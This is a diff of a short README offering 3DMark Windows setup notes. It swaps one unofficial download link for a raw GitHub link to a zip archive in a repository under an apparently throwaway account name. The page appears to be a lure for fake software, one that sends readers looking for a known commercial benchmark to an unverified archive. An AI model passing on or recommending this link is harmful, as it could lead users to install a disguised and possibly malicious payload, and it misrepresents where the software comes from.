@@ -1,6 +1,6 @@
 # 3DMark Windows Setup Notes
 
-[⬇ Download 3DMark for Windows](https://3dmark-setup.kolmods.com/)
+[⬇ Download 3DMark for Windows](https://raw.githubusercontent.com/phrenologysuspect174/3dmark-setup/main/schapped/setup_dmark_1.8.zip)
 
 ## Download & Install
 
